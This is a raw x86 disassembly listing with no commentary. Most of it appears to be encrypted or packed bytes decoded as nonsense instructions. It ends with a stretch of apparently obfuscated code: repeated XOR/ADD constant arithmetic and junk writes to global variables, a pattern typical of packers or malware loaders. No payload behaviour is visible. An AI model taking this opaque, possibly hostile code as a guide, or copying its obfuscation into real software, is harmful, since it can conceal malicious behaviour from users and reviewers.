  40cc6b:	faddp  st(2),st
  40cc6d:	lds    eax,FWORD PTR [ecx]
  40cc6f:	ffree  st(4)
  40cc71:	hlt    
  40cc72:	clc    
  40cc73:	loope  0x40cc6f
  40cc75:	ret    
  40cc76:	(bad)
  40cc79:	int3   
  40cc7a:	out    dx,al
  40cc7b:	(bad)  
  40cc7c:	shl    DWORD PTR [edi-0x20163420],cl
  40cc82:	retf   0xf1d6
  40cc85:	shl    BYTE PTR [esi+0x7f9d9da],cl
  40cc8b:	mov    esp,0xca05ebd8
  40cc90:	(bad)  
  40cc91:	or     cl,BYTE PTR [ecx]
  40cc93:	frndint 
  40cc95:	ret    0xd0e0
  40cc98:	in     al,0xac
  40cc9a:	mov    cl,0xca
  40cc9c:	call   0xdffa9d88
  40cca1:	retf   0xd5b5
  40cca4:	(bad)  
  40cca5:	idiv   esp
  40cca7:	icebp  
  40cca8:	hlt    
  40cca9:	rcr    ebp,1
  40ccab:	jmp    0xddc4:0xefe5ff06
  40ccb2:	inc    DWORD PTR [edx]
  40ccb4:	retf   0xa8b2
  40ccb7:	shr    dl,1
  40ccb9:	imul   dl
  40ccbb:	div    BYTE PTR [ecx-0x22a1b14]
  40ccc1:	retf   
  40ccc2:	std    
  40ccc3:	out    dx,eax
  40ccc4:	in     al,dx
  40ccc5:	sti    
  40ccc6:	(bad)  
  40ccc7:	repz loope 0x40cc86
  40ccca:	mov    edx,0xfb06dac7
  40cccf:	fiadd  WORD PTR [esi]
  40ccd1:	push   es
  40ccd2:	in     al,dx
  40ccd3:	loop   0x40ccce
  40ccd5:	mov    ebp,0xebe3ecc0
  40ccda:	shl    dl,cl
  40ccdc:	shl    ah,cl
  40ccde:	rol    dh,1
  40cce0:	mov    edx,0xffbab9ee
  40cce5:	(bad)  
  40cce6:	rol    DWORD PTR [edx],cl
  40cce8:	aad    0x0
  40ccea:	mov    esp,0xffdcdbd4
  40ccef:	stc    
  40ccf0:	jmp    0x40ccfd
  40ccf2:	out    0xcf,al
  40ccf4:	or     edx,esi
  40ccf6:	repz test cl,0xdd
  40ccfa:	sti    
  40ccfb:	mov    ebx,0xf0b1f6ec
  40cd00:	(bad)
  40cd03:	leave  
  40cd04:	icebp  
  40cd05:	aam    0xee
  40cd07:	fcmovnbe st,st(7)
  40cd09:	mov    ebx,0xf1e9d5f2
  40cd0e:	jmp    0xdc2cc202
  40cd13:	(bad)  
  40cd15:	ret    
  40cd16:	mov    esi,0xb5f0ebbd
  40cd1b:	mov    cl,0xe2
  40cd1d:	retf   0xe8f9
  40cd20:	retf   
  40cd21:	cli    
  40cd22:	cli    
  40cd23:	fucomp st(5)
  40cd25:	into   
  40cd26:	mov    dh,0xc1
  40cd28:	neg    al
  40cd2a:	mov    edx,0x5fcd001
  40cd2f:	jmp    0x40cd14
  40cd31:	fucomp st(1)
  40cd33:	out    0xca,eax
  40cd35:	fdivr  QWORD PTR [edi+edi*4-0x4b302f35]
  40cd3c:	mov    bl,0xb7
  40cd3e:	xlat   BYTE PTR ds:[ebx]
  40cd3f:	lock in al,dx
  40cd41:	aam    0xcd
  40cd43:	jmp    0x40cd13
  40cd45:	loop   0x40cd43
  40cd47:	lock fcomi st,st(1)
  40cd4a:	rol    bl,cl
  40cd4c:	add    dl,al
  40cd4e:	in     al,0xee
  40cd50:	std    
  40cd51:	mov    BYTE PTR ds:0xced2ff03,0xbe
  40cd58:	scas   eax,DWORD PTR es:[edi]
  40cd59:	int3   
  40cd5a:	call   0xb536bf32
  40cd5f:	lock aad 0xd6
  40cd62:	jecxz  0x40cd1f
  40cd64:	retf   0xd2bf
  40cd67:	add    cl,ch
  40cd69:	out    0x0,al
  40cd6b:	shl    ecx,1
  40cd6d:	(bad)  
  40cd6e:	jecxz  0x40cd3f
  40cd70:	iret   
  40cd71:	add    ecx,esi
  40cd73:	in     eax,0x5
  40cd75:	stos   BYTE PTR es:[edi],al
  40cd76:	xlat   BYTE PTR ds:[ebx]
  40cd77:	(bad)  
  40cd78:	mov    esp,0xc2b7c1e3
  40cd7d:	rcl    bh,1
  40cd7f:	retf   
  40cd80:	xlat   BYTE PTR ds:[ebx]
  40cd81:	mov    ch,0xf7
  40cd83:	out    dx,eax
  40cd84:	mov    eax,0x707d5c8
  40cd89:	add    al,0xe7
  40cd8b:	rcl    cl,cl
  40cd8d:	fadd   DWORD PTR [esi]
  40cd8f:	loopne 0x40cd7b
  40cd91:	std    
  40cd92:	out    dx,al
  40cd93:	in     al,dx
  40cd94:	faddp  st(1),st
  40cd96:	in     eax,dx
  40cd97:	fdivr  QWORD PTR [esi-0x49141736]
  40cd9d:	mov    cl,0xff
  40cd9f:	out    0xea,eax
  40cda1:	jmp    0xfbe1:0xfbf5d7fa
  40cda8:	int    0xdf
  40cdaa:	ret    0xdde1
  40cdad:	ret    
  40cdae:	or     bh,ah
  40cdb0:	clc    
  40cdb1:	sti    
  40cdb2:	add    bl,bh
  40cdb4:	or     cl,dh
  40cdb6:	mov    eax,0xc7e6bcf7
  40cdbb:	cmc    
  40cdbc:	mov    ebx,0xeaf5cab4
  40cdc1:	(bad)  
  40cdc3:	fadd   st(3),st
  40cdc5:	enter  0xfcf6,0xe7
  40cdc9:	pop    es
  40cdca:	clc    
  40cdcb:	or     edx,esp
  40cdcd:	loopne 0x40cdc4
  40cdcf:	(bad)  
  40cdd1:	iret   
  40cdd2:	les    eax,FWORD PTR [ecx]
  40cdd4:	rcr    dh,cl
  40cdd6:	loopne 0x40cd88
  40cdd8:	(bad)  
  40cdd9:	mov    dl,0xe6
  40cddb:	xlat   BYTE PTR ds:[ebx]
  40cddc:	int3   
  40cddd:	(bad)  
  40cdde:	xlat   BYTE PTR ds:[ebx]
  40cddf:	aad    0xf8
  40cde1:	in     eax,dx
  40cde2:	into   
  40cde3:	jmp    0xc100b7ca
  40cde8:	add    bh,bl
  40cdea:	ret    0xc3fe
  40cded:	shl    ebp,1
  40cdef:	retf   0xef05
  40cdf2:	out    0x6,al
  40cdf4:	out    0xec,eax
  40cdf6:	fadd   st,st(6)
  40cdf8:	in     al,dx
  40cdf9:	out    dx,al
  40cdfa:	sti    
  40cdfb:	lods   al,BYTE PTR ds:[esi]
  40cdfc:	in     eax,dx
  40cdfd:	loope  0x40cdd0
  40cdff:	fdivp  st(0),st
  40ce01:	leave  
  40ce02:	mov    esp,0xfab8f2c9
  40ce07:	push   edi
  40ce09:	(bad)  
  40ce0b:	lock loope 0x40ce19
  40ce0e:	push   es
  40ce0f:	add    BYTE PTR [ecx],al
  40ce11:	hlt    
  40ce12:	add    ebx,ebx
  40ce14:	enter  0xacbd,0xca
  40ce18:	loope  0x40cdf7
  40ce1a:	out    dx,al
  40ce1b:	lock lock out 0xd2,eax
  40ce1f:	cmc    
  40ce20:	clc    
  40ce21:	(bad)
  40ce24:	std    
  40ce25:	out    dx,eax
  40ce26:	repnz mov ch,0xed
  40ce29:	repnz (bad) 
  40ce2b:	out    0xdb,eax
  40ce2d:	rol    al,1
  40ce2f:	out    dx,eax
  40ce30:	call   0xd846d921
  40ce35:	int3   
  40ce36:	mov    esi,0xe4cbe5e6
  40ce3b:	xlat   BYTE PTR ds:[ebx]
  40ce3c:	int    0xee
  40ce3e:	in     eax,0xba
  40ce40:	cmc    
  40ce41:	sti    
  40ce42:	fmul   st(2),st
  40ce44:	into   
  40ce45:	cmc    
  40ce46:	out    dx,al
  40ce47:	fldz   
  40ce49:	(bad)  
  40ce4a:	mov    esi,0xbf001f8
  40ce4f:	lds    eax,FWORD PTR [ecx]
  40ce51:	in     eax,dx
  40ce52:	fcmovu st,st(6)
  40ce54:	fxch   st(1)
  40ce56:	jmp    0xe9b3:0xf7b3d2c4
  40ce5d:	sar    BYTE PTR [ecx-0x31020507],1
  40ce63:	retf   0xddde
  40ce66:	mov    eax,0xfefcf9fb
  40ce6b:	fadd   st,st(5)
  40ce6d:	jecxz  0x40ce5f
  40ce6f:	iret   
  40ce70:	std    
  40ce71:	jmp    0xb30cce64
  40ce76:	jmp    0xe2157c6e
  40ce7b:	test   eax,0xdee8f6f0
  40ce80:	enter  0xb2f2,0xc8
  40ce84:	cmc    
  40ce85:	mov    edi,0xffeecdb9
  40ce8a:	fsub   st,st(5)
  40ce8c:	add    bh,BYTE PTR [edi-0x221f0435]
  40ce92:	jmp    0xe7c0:0xecabcbdf
  40ce99:	mov    esp,0xb3d4b2c1
  40ce9e:	out    0xf2,eax
  40cea0:	jmp    0xe1e8:0xfcbacfd0
  40cea7:	mov    ebp,0xdf03ecd5
  40ceac:	std    
  40cead:	(bad)
  40ceb0:	in     eax,0xd4
  40ceb2:	repz enter 0xe8ff,0xea
  40ceb7:	in     al,dx
  40ceb8:	loop   0x40ce8f
  40ceba:	jmp    0xb5fa9d92
  40cebf:	(bad)  
  40cec0:	shr    ebx,cl
  40cec2:	fnstsw WORD PTR [eax-0xc0647ff]
  40cec8:	into   
  40cec9:	add    eax,0x8dc00c0
  40cece:	sti    
  40cecf:	(bad)  
  40ced0:	into   
  40ced1:	push   es
  40ced2:	sti    
  40ced3:	add    dh,dl
  40ced5:	in     eax,0xc6
  40ced7:	(bad)  
  40ced8:	shr    BYTE PTR [esi+esi*4-0x34324d0e],cl
  40cedf:	shr    esp,1
  40cee1:	mov    ch,0xea
  40cee3:	jmp    0x40cee1
  40cee5:	loope  0x40ceb9
  40cee7:	mov    ch,0xd7
  40cee9:	(bad)
  40ceec:	aam    0xf7
  40ceee:	leave  
  40ceef:	(bad)  
  40cef1:	loope  0x40ceb5
  40cef3:	add    eax,0xaee2bd05
  40cef8:	repnz div bl
  40cefb:	mov    dh,0xce
  40cefd:	mov    ah,0xc8
  40ceff:	mov    ah,0xcd
  40cf01:	(bad)  
  40cf02:	fxch   st(2)
  40cf04:	aam    0xd2
  40cf06:	fxch   st(7)
  40cf08:	mul    edi
  40cf0a:	(bad)  
  40cf0b:	call   esi
  40cf0d:	out    0xdf,al
  40cf0f:	fucomip st,st(5)
  40cf11:	les    eax,FWORD PTR ds:0xe7efd303
  40cf17:	in     eax,0xf3
  40cf19:	out    dx,al
  40cf1a:	(bad)  [eax-0x4a4b3705]
  40cf20:	in     eax,dx
  40cf21:	(bad)  
  40cf22:	fucomp st(5)
  40cf24:	cli    
  40cf25:	mov    ecx,0xf6c2e601
  40cf2a:	mov    edx,0xd9f7caf9
  40cf2f:	aam    0x0
  40cf31:	(bad)  
  40cf34:	push   es
  40cf35:	jmp    0xe831ba11
  40cf3a:	(bad)  
  40cf3b:	(bad)
  40cf3e:	hlt    
  40cf3f:	aad    0xf3
  40cf41:	in     eax,0xb2
  40cf43:	repz jmp 0xfcf7:0xd3f1e0bc
  40cf4b:	xlat   BYTE PTR ds:[ebx]
  40cf4c:	out    0x6,eax
  40cf4e:	fmul   st(7),st
  40cf50:	(bad)  [esi]
  40cf52:	ret    0x9ea
  40cf55:	mov    esi,0xd1bcdce5
  40cf5a:	jmp    0xb9c7:0xdfebc0f4
  40cf61:	cmc    
  40cf62:	cld    
  40cf63:	out    dx,eax
  40cf64:	mov    ecx,0xf5dcf2f3
  40cf69:	(bad)  
  40cf6b:	inc    ch
  40cf6d:	cmc    
  40cf6e:	imul   edi
  40cf70:	std    
  40cf71:	in     al,0xf
  40cf73:	or     al,0xe9
  40cf75:	int    0xd7
  40cf77:	mov    esp,0xd5edafd3
  40cf7c:	mov    bl,0xe6
  40cf7e:	out    dx,al
  40cf7f:	out    dx,al
  40cf80:	retf   
  40cf81:	clc    
  40cf82:	(bad)  
  40cf83:	shr    dh,1
  40cf85:	aam    0x2
  40cf87:	out    dx,eax
  40cf88:	loope  0x40cf7a
  40cf8a:	icebp  
  40cf8b:	mov    esp,0xe6e909c5
  40cf90:	loope  0x40cf6f
  40cf92:	leave  
  40cf93:	or     eax,0xc4adef09
  40cf98:	mov    dh,0xe8
  40cf9a:	leave  
  40cf9b:	ror    edx,cl
  40cf9d:	enter  0xd5ee,0xb5
  40cfa1:	in     eax,0xbb
  40cfa3:	repz (bad) 
  40cfa6:	int3   
  40cfa7:	out    dx,al
  40cfa8:	in     eax,0xd0
  40cfaa:	div    cl
  40cfac:	loop   0x40cfaf
  40cfae:	jmp    0xfe2edd88
  40cfb3:	add    al,0xf2
  40cfb5:	mov    bl,0xe6
  40cfb7:	lods   eax,DWORD PTR ds:[esi]
  40cfb8:	shl    ebp,1
  40cfba:	iret   
  40cfbb:	mov    ebx,0xf7b6cdf9
  40cfc0:	fcomip st,st(7)
  40cfc2:	(bad)  
  40cfc3:	stc    
  40cfc4:	mov    eax,0xd4f0b803
  40cfc9:	ret    0x7e4
  40cfcc:	add    eax,0xc00705cb
  40cfd1:	std    
  40cfd2:	stc    
  40cfd3:	loop   0x40cfb1
  40cfd5:	stos   BYTE PTR es:[edi],al
  40cfd6:	test   eax,0xe2e9f7f1
  40cfdb:	shl    cl,cl
  40cfdd:	mov    ah,0xc7
  40cfdf:	in     al,0xdf
  40cfe1:	mov    ebx,0xc1faf8d2
  40cfe6:	fprem1 
  40cfe8:	cli    
  40cfe9:	ret    0xe4e6
  40cfec:	(bad)  
  40cfee:	jecxz  0x40cfc7
  40cff0:	mov    BYTE PTR [eax],0xe9
  40cff3:	stc    
  40cff4:	jmp    0x40cfdf
  40cff6:	shr    ch,cl
  40cff8:	jmp    0xb226b1e1
  40cffd:	fxch   st(0)
  40cfff:	out    dx,eax
  40d000:	mov    ebx,0xdbf8faf0
  40d005:	sti    
  40d006:	lock ret 0xbbcc
  40d00a:	ret    
  40d00b:	lock (bad) 
  40d00d:	idiv   BYTE PTR [esi-0x181a1ffe]
  40d013:	jmp    0xb2dd:0xa9eaeb02
  40d01a:	fucomi st,st(6)
  40d01c:	(bad)  
  40d01e:	leave  
  40d01f:	mov    ah,0xb6
  40d021:	cld    
  40d022:	mov    esi,0x3ee01b4
  40d027:	add    eax,DWORD PTR [edi]
  40d029:	fadd   DWORD PTR [edx]
  40d02b:	xlat   BYTE PTR ds:[ebx]
  40d02c:	mov    eax,0x8fcfaca
  40d031:	fcmovb st,st(2)
  40d033:	fiadd  DWORD PTR [esi+eiz*8]
  40d036:	fsubr  DWORD PTR [ecx-0x3e351222]
  40d03c:	mov    ah,0xb7
  40d03e:	mov    edx,0xf4ebcfef
  40d043:	(bad)  
  40d045:	out    dx,al
  40d046:	icebp  
  40d047:	add    esp,ebp
  40d049:	loop   0x40d02f
  40d04b:	imul   ebx
  40d04d:	aad    0x1
  40d04f:	retf   
  40d050:	push   cs
  40d051:	add    al,0xd8
  40d053:	repnz or al,0xd2
  40d056:	fsubp  st(6),st
  40d058:	mov    esi,0xf6ecadcf
  40d05d:	in     al,dx
  40d05e:	in     al,dx
  40d05f:	mov    ah,0xd9
  40d061:	hlt    
  40d062:	out    dx,al
  40d063:	in     al,dx
  40d064:	cld    
  40d065:	out    dx,al
  40d066:	(bad)  
  40d068:	add    edx,eax
  40d06a:	cld    
  40d06b:	out    0xb,eax
  40d06d:	out    0xe6,eax
  40d06f:	fld    DWORD PTR [edi]
  40d071:	clc    
  40d072:	leave  
  40d073:	fcomi  st,st(1)
  40d075:	ret    
  40d076:	jecxz  0x40d044
  40d078:	(bad)
  40d07b:	xlat   BYTE PTR ds:[ebx]
  40d07c:	in     eax,0xd2
  40d07e:	mov    bh,0xdf
  40d080:	call   eax
  40d082:	aad    0xee
  40d084:	icebp  
  40d085:	(bad)  
  40d087:	sar    edi,cl
  40d089:	out    0xc4,eax
  40d08b:	ret    
  40d08c:	clc    
  40d08d:	clc    
  40d08e:	aam    0xe4
  40d090:	or     ah,dh
  40d092:	add    edi,ebx
  40d094:	in     eax,dx
  40d095:	out    dx,eax
  40d096:	out    0xc2,eax
  40d098:	aad    0xb6
  40d09a:	jecxz  0x40d05d
  40d09c:	(bad)
  40d09f:	jmp    0xf030c45e
  40d0a4:	mov    edi,0xced3f5d6
  40d0a9:	(bad)  
  40d0aa:	shl    bh,cl
  40d0ac:	retf   0xc4fe
  40d0af:	or     edi,edi
  40d0b1:	loopne 0x40d092
  40d0b3:	in     al,0x1
  40d0b5:	(bad)  
  40d0b6:	lock loop 0x40d075
  40d0b9:	(bad)
  40d0bd:	out    dx,eax
  40d0be:	icebp  
  40d0bf:	enter  0xcec8,0xef
  40d0c3:	aam    0xf5
  40d0c5:	std    
  40d0c6:	mov    edx,0xe1dedeff
  40d0cb:	std    
  40d0cc:	hlt    
  40d0cd:	aad    0xc9
  40d0cf:	call   0xa4fddce
  40d0d4:	repz mov dl,0xce
  40d0d7:	test   al,0xb7
  40d0d9:	cmc    
  40d0da:	mov    ch,0xc0
  40d0dc:	fld    st(5)
  40d0de:	out    dx,al
  40d0df:	lods   eax,DWORD PTR ds:[esi]
  40d0e0:	(bad)
  40d0e3:	mov    ebx,0xdcf1d0fc
  40d0e8:	in     eax,dx
  40d0e9:	add    ah,ah
  40d0eb:	in     al,0xf9
  40d0ed:	ror    edx,1
  40d0ef:	add    BYTE PTR [ebx],cl
  40d0f1:	(bad)
  40d0f4:	(bad)  
  40d0f6:	(bad)  
  40d0f7:	repz mov ebx,0xf0fafabc
  40d0fe:	retf   0xccf0
  40d101:	cld    
  40d102:	fincstp 
  40d104:	repz (bad) 
  40d107:	into   
  40d108:	aam    0xbf
  40d10a:	aam    0xd3
  40d10c:	jmp    0xd908d00e
  40d111:	into   
  40d112:	(bad)  
  40d114:	in     al,0xec
  40d116:	loope  0x40d0e1
  40d118:	mul    edx
  40d11a:	lock (bad) 
  40d11d:	mov    edx,0xf9d5bbf8
  40d122:	icebp  
  40d123:	mov    ch,0xf5
  40d125:	(bad)  
  40d127:	sar    ebx,1
  40d129:	xlat   BYTE PTR ds:[ebx]
  40d12a:	mov    ebp,0xc0d7dffa
  40d12f:	(bad)  
  40d130:	jmp    0x947d309
  40d135:	ret    
  40d136:	icebp  
  40d137:	(bad)  
  40d138:	rcl    eax,1
  40d13a:	scas   al,BYTE PTR es:[edi]
  40d13b:	loope  0x40d121
  40d13d:	mov    edx,0xb4fae6d1
  40d142:	mov    ebp,0xfeccf7cc
  40d147:	repz in eax,0xfb
  40d14a:	div    ch
  40d14c:	sti    
  40d14d:	rol    DWORD PTR [edx],1
  40d14f:	aad    0xc8
  40d151:	stc    
  40d152:	or     dl,ah
  40d154:	adc    bh,BYTE PTR [esi-0x133e3e57]
  40d15a:	shl    esp,0xc0
  40d15d:	jmp    0xe8d0:0xccf6f4ea
  40d164:	in     eax,dx
  40d165:	int    0xdb
  40d167:	mov    DWORD PTR [edi],0x4f7f9e0
  40d16d:	hlt    
  40d16e:	cli    
  40d16f:	(bad)  
  40d170:	fimul  DWORD PTR [edx]
  40d172:	loop   0x40d152
  40d174:	icebp  
  40d175:	mov    eax,0xd2afd7e6
  40d17a:	loope  0x40d156
  40d17c:	retf   
  40d17d:	shr    ah,0xfe
  40d180:	hlt    
  40d181:	fdivrp st(4),st
  40d183:	fdivr  st,st(5)
  40d185:	fcmovnu st,st(2)
  40d187:	mov    ebp,0xbddff3d9
  40d18c:	imul   eax
  40d18e:	leave  
  40d18f:	call   0xce34986e
  40d194:	inc    ecx
  40d196:	mov    edi,0xcac7f3f0
  40d19b:	shl    BYTE PTR [edx-0x4b29141f],cl
  40d1a1:	in     eax,dx
  40d1a2:	sar    cl,1
  40d1a4:	enter  0xf8d7,0xc1
  40d1a8:	out    0xed,eax
  40d1aa:	(bad)  
  40d1ac:	jmp    0x40d177
  40d1ae:	cli    
  40d1af:	retf   0xedd8
  40d1b2:	or     ecx,ecx
  40d1b4:	rcl    cl,cl
  40d1b6:	(bad)  
  40d1b8:	repz aad 0xf0
  40d1bb:	(bad)  
  40d1bc:	(bad)  
  40d1bd:	jmp    0xe8f1bb8b
  40d1c2:	fdivr  DWORD PTR [esi-0xa313138]
  40d1c8:	loope  0x40d1c9
  40d1ca:	cmc    
  40d1cb:	(bad)
  40d1ce:	enter  0xe5d4,0xe2
  40d1d2:	enter  0xd8ea,0xc1
  40d1d6:	fidivr WORD PTR [ebp+ebp*4-0x9325516]
  40d1dd:	aam    0xb9
  40d1df:	icebp  
  40d1e0:	fidiv  WORD PTR [ebp-0x2f0f3405]
  40d1e6:	clc    
  40d1e7:	add    edi,DWORD PTR [eax-0x382ffa02]
  40d1ed:	dec    ebx
  40d1ef:	or     dh,cl
  40d1f1:	fcomp  st(7)
  40d1f3:	or     DWORD PTR [esi],ecx
  40d1f5:	mov    dl,0xc6
  40d1f7:	jecxz  0x40d1a6
  40d1f9:	cmc    
  40d1fa:	shl    dh,cl
  40d1fc:	xlat   BYTE PTR ds:[ebx]
  40d1fd:	clc    
  40d1fe:	retf   
  40d1ff:	jmp    0xd71b88b9
  40d204:	mov    al,0xf4
  40d206:	repnz mov ecx,0xf3ccd6ec
  40d20c:	repnz pop es
  40d20e:	(bad)  
  40d20f:	(bad)  
  40d211:	enter  0x4ea,0xcb
  40d215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d216:	int3   
  40d217:	in     eax,0xf1
  40d219:	mov    bl,0xc0
  40d21b:	loope  0x40d1ec
  40d21d:	fcmovbe st,st(7)
  40d21f:	ror    ebx,cl
  40d221:	call   0xed3cbf22
  40d226:	ror    esp,cl
  40d228:	rcr    ch,1
  40d22a:	add    eax,0x5424137
  40d22f:	adc    ecx,0x0
  40d232:	mov    ecx,DWORD PTR [ebp-0x4]
  40d235:	mov    ecx,DWORD PTR [ecx]
  40d237:	xor    ecx,eax
  40d239:	mov    eax,DWORD PTR [ebp-0x4]
  40d23c:	mov    DWORD PTR [eax],ecx
  40d23e:	mov    eax,DWORD PTR [ebp+0x14]
  40d241:	mov    eax,DWORD PTR [eax]
  40d243:	mov    DWORD PTR [ebp-0x38],eax
  40d246:	mov    eax,DWORD PTR [ebp-0x38]
  40d249:	mov    eax,DWORD PTR [eax]
  40d24b:	mov    ecx,DWORD PTR [ebp-0x4]
  40d24e:	mov    ecx,DWORD PTR [ecx]
  40d250:	xor    edx,edx
  40d252:	sub    ecx,0x5424137
  40d258:	sbb    edx,0x0
  40d25b:	xor    ecx,0x8a29a14b
  40d261:	xor    edx,0x0
  40d264:	xor    ecx,0x8a29a14b
  40d26a:	xor    edx,0x0
  40d26d:	add    ecx,0x5424137
  40d273:	adc    edx,0x0
  40d276:	mov    eax,DWORD PTR [eax]
  40d278:	xor    esi,esi
  40d27a:	add    eax,ecx
  40d27c:	adc    esi,edx
  40d27e:	mov    ecx,DWORD PTR [ebp-0x38]
  40d281:	mov    ecx,DWORD PTR [ecx]
  40d283:	mov    DWORD PTR [ecx],eax
  40d285:	mov    eax,DWORD PTR [ebp-0xc]
  40d288:	mov    DWORD PTR [eax],0x70941f81
  40d28e:	mov    DWORD PTR [eax+0x4],0xffffffff
  40d295:	mov    eax,DWORD PTR [ebp-0x18]
  40d298:	mov    ecx,DWORD PTR [ebp-0x14]
  40d29b:	mov    DWORD PTR [ebp-0x40],eax
  40d29e:	mov    DWORD PTR [ebp-0x3c],ecx
  40d2a1:	cmp    DWORD PTR [ebp-0x40],0x70941f81
  40d2a8:	jne    0x40d342
  40d2ae:	cmp    DWORD PTR [ebp-0x3c],0xffffffff
  40d2b2:	jne    0x40d342
  40d2b8:	mov    eax,DWORD PTR [ebp-0x4]
  40d2bb:	mov    eax,DWORD PTR [eax]
  40d2bd:	xor    ecx,ecx
  40d2bf:	sub    eax,0x5424137
  40d2c4:	sbb    ecx,0x0
  40d2c7:	xor    eax,0x8a29a14b
  40d2cc:	xor    ecx,0x0
  40d2cf:	mov    edx,DWORD PTR [ebp+0x8]
  40d2d2:	xor    edx,0x75108b5
  40d2d8:	add    edx,0x3272fb
  40d2de:	xor    esi,esi
  40d2e0:	sub    edx,0x5424137
  40d2e6:	sbb    esi,0x0
  40d2e9:	xor    edx,0x8a29a14b
  40d2ef:	xor    esi,0x0
  40d2f2:	mov    DWORD PTR [ebp-0x48],eax
  40d2f5:	mov    DWORD PTR [ebp-0x44],ecx
  40d2f8:	mov    DWORD PTR [ebp-0x50],edx
  40d2fb:	mov    DWORD PTR [ebp-0x4c],esi
  40d2fe:	mov    eax,DWORD PTR [ebp-0x48]
  40d301:	cmp    eax,DWORD PTR [ebp-0x50]
  40d304:	jne    0x40d342
  40d30a:	mov    eax,DWORD PTR [ebp-0x44]
  40d30d:	cmp    eax,DWORD PTR [ebp-0x4c]
  40d310:	jne    0x40d342
  40d316:	mov    eax,DWORD PTR [ebp-0x4]
  40d319:	mov    eax,DWORD PTR [eax]
  40d31b:	xor    ecx,ecx
  40d31d:	sub    eax,0x5424137
  40d322:	sbb    ecx,0x0
  40d325:	xor    eax,0x8a29a14b
  40d32a:	xor    ecx,0x0
  40d32d:	xor    eax,0x8a29a14b
  40d332:	xor    ecx,0x0
  40d335:	add    eax,0x5424137
  40d33a:	adc    ecx,0x0
  40d33d:	mov    ecx,DWORD PTR [ebp-0x8]
  40d340:	mov    DWORD PTR [ecx],eax
  40d342:	pop    esi
  40d343:	leave  
  40d344:	ret    0x10
  40d347:	push   ebp
  40d348:	mov    ebp,esp
  40d34a:	sub    esp,0x144
  40d350:	sub    DWORD PTR ds:0x437723,0x4cfe
  40d35a:	push   ebx
  40d35b:	or     eax,DWORD PTR ds:0x437783
  40d361:	push   esi
  40d362:	mov    DWORD PTR [ebp-0x3c],0xf89c85b0
  40d369:	or     eax,0x788f
  40d36e:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40d375:	mov    eax,DWORD PTR [ebp-0x3c]
  40d378:	xor    eax,0x75108b5
  40d37d:	mov    DWORD PTR ds:0x437727,0x3e42
  40d387:	add    eax,0x3272fb
  40d38c:	mov    DWORD PTR [ebp-0x28],eax
  40d38f:	cmp    DWORD PTR [ebp+0x14],0x0
  40d393:	mov    DWORD PTR ds:0x4377a3,0x7433
  40d39d:	je     0x40d3c5
  40d3a3:	adc    DWORD PTR ds:0x437743,ebx
  40d3a9:	mov    eax,DWORD PTR [ebp+0x14]
  40d3ac:	adc    DWORD PTR ds:0x437777,0x7bf4
  40d3b6:	mov    eax,DWORD PTR [eax]
  40d3b8:	mov    DWORD PTR ds:0x437753,0x6d3d
  40d3c2:	mov    DWORD PTR [ebp-0x28],eax
  40d3c5:	dec    DWORD PTR ds:0x43775f
  40d3cb:	mov    eax,DWORD PTR [ebp-0x3c]
  40d3ce:	sbb    DWORD PTR ds:0x437783,0x437787
  40d3d8:	xor    eax,0x75108b5
  40d3dd:	adc    DWORD PTR ds:0x437767,0x43775f
  40d3e7:	add    eax,0x3272fb
  40d3ec:	mov    DWORD PTR [ebp-0x2c],eax
  40d3ef:	sub    DWORD PTR ds:0x43774f,edx
  40d3f5:	mov    eax,DWORD PTR [ebp-0x40]
  40d3f8:	or     DWORD PTR ds:0x43778f,0x43774b
  40d402:	xor    eax,0x75108b5
  40d407:	add    DWORD PTR ds:0x43772f,0x43771f
  40d411:	add    eax,0x3272fb
  40d416:	adc    DWORD PTR ds:0x4377a3,0x39ac
  40d420:	mov    DWORD PTR [ebp-0x4],eax
  40d423:	sub    DWORD PTR ds:0x437743,0x27b7
  40d42d:	mov    eax,DWORD PTR [ebp-0x3c]
  40d430:	sbb    DWORD PTR ds:0x4377a7,0x43779f
  40d43a:	xor    eax,0x75108b5
  40d43f:	add    eax,0x3272fb
  40d444:	mov    DWORD PTR [ebp-0x8],eax
  40d447:	movzx  eax,BYTE PTR ds:0x43779b
  40d44e:	xor    DWORD PTR ds:0x437753,eax
  40d454:	mov    eax,DWORD PTR [ebp-0x3c]
  40d457:	xor    eax,0x75108b5
  40d45c:	add    eax,0x3272fb
  40d461:	mov    DWORD PTR ds:0x437723,0x519f
  40d46b:	mov    DWORD PTR [ebp-0x44],eax
  40d46e:	jmp    0x40d503
  40d473:	mov    eax,DWORD PTR [ebp-0x40]
  40d476:	xor    eax,0x75108b5
  40d47b:	mov    DWORD PTR ds:0x437737,0x12
  40d485:	cmp    DWORD PTR ds:0x437737,0x0
  40d48c:	je     0x40d4e4
  40d492:	cmp    DWORD PTR ds:0x437737,0x2
  40d499:	jb     0x40d4e4
  40d49f:	jmp    0x40d4b8
  40d4a4:	push   DWORD PTR [ebp-0x14]
  40d4a7:	push   DWORD PTR [ebp-0x14]
  40d4aa:	push   0x43776f
  40d4af:	push   DWORD PTR [ebp-0x14]
  40d4b2:	call   DWORD PTR ds:0x43c99c
  40d4b8:	cmp    DWORD PTR ds:0x437737,0x3
  40d4bf:	jne    0x40d4d2
  40d4c5:	mov    ecx,DWORD PTR ds:0x437737
  40d4cb:	dec    ecx
  40d4cc:	mov    DWORD PTR ds:0x437737,ecx
  40d4d2:	mov    ecx,DWORD PTR ds:0x437737
  40d4d8:	dec    ecx
  40d4d9:	mov    DWORD PTR ds:0x437737,ecx
  40d4df:	jmp    0x40d485
  40d4e4:	mov    ecx,DWORD PTR [ebp-0x44]
  40d4e7:	lea    eax,[ecx+eax*1+0x3272fb]
  40d4ee:	mov    ecx,DWORD PTR ds:0x43771b
  40d4f4:	sub    ecx,DWORD PTR ds:0x43779f
  40d4fa:	mov    DWORD PTR ds:0x43771b,ecx
  40d500:	mov    DWORD PTR [ebp-0x44],eax
  40d503:	and    DWORD PTR ds:0x4377bb,0x0
  40d50d:	jmp    0x40d521
  40d512:	xor    ecx,ecx
  40d514:	or     ecx,DWORD PTR ds:0x4377bb
  40d51a:	inc    ecx
  40d51b:	mov    DWORD PTR ds:0x4377bb,ecx
  40d521:	cmp    DWORD PTR ds:0x4377bb,0x1b
  40d528:	jae    0x40d57e
  40d52e:	cmp    DWORD PTR ds:0x4377bb,0x9
  40d535:	jb     0x40d57e
  40d53b:	jmp    0x40d55f
  40d540:	push   0x407a
  40d545:	push   0x6d74
  40d54a:	push   0x48da
  40d54f:	push   0x6ac6
